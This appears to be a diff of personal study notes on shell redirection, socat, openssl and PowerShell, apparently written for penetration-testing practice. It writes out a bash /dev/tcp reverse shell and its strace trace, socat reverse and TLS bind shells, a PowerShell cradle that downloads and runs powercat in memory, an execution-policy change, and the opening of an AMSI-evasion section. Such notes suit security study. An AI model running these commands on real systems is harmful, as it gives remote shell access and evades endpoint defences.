@@ -132,7 +132,8 @@
      + wc -mwl < filename
 
 **** advanced: the mechanisms && stdin, stdout, stderr redirecting.
-     + ~bash -i >& /dev/tcp/192.168.140.1/1337 0>&1~ //the meaning:
+     + ~bash -i >& /dev/tcp/192.168.140.1/1337 0>&1~ //the meaning.
+
 ***** the ~>&~ || ~&>~ //(if FD number is omitted):
       1. *syntax for redirecting stderr*, the 3 variants are semantically equivalent:
          - ~>& dst~
@@ -169,7 +170,7 @@
 ***** use the ~strace~:
       + ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ //grep -n 192.168.140.1 strace.out, check syscalls around the line
         - //1(stdout)>3(socket) => 0(stdin)>1(stdout, socket)
-        - //since the socket is bidirectional, both input and output are legal.
+        - //since the socket is bidirectional, both read and write are legal.
 
 *** apt(Advanced Package Tool)
     + apt update: update the db info
@@ -334,13 +335,29 @@
 *** socat
     + ~socat [-u|U] TCP-LISTEN:127.0.0.1:1337,fork path/to/file~ //uni-directional mode: U for right to left, u for left to right. Be careful not to override the source file.
     + ~socat tcp-connect:127.0.0.1:1337 exec:/bin/sh,stderr,pty[,setsid,sigint,sane]~ //reverse shell
-
+    + //misc methods:
+      - ~socat -d -d TCP4-LISTEN:443 STDOUT~ //...but why bother
+      - ~socat TCP4:127.0.0.1:443 EXEC:/bin/bash~ //...use the parameterizes
+      
+*** openssl
+    + ~openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt~
+      - ~cat bind_shell.key bind_shell.crt > bind_shell.pem~
+      - ~sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash,stderr,pty,setsid,sigint,sane~ //bind_shell, can be connected with nc --ssl option
 
 *** TODO linux syscalls
     + ~strace -f~ //follow child processes created, syscall: fork
       - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~
 
 ** TODO powershell scripting
+   + ~Get-Help(help)~
+   + ~Set-ExecutionPolicy Unrestricted~
+   + ~Get-ExecutionPolicy~
+   + FIXME ? ~powershell -c ""~
+
+*** powershell DownloadFile && *DownloadString*
+   + ~powershell -c "(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/wget.exe','./wget.exe')"~
+   + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //load the remote script during the session only 
+
 *** TODO basic params(-nop, -c, etc.)
 *** amsi evasion (//"this script contains malicious content and has been blocked by your antivirus software")
      + $evil_0 = "amsicontext"
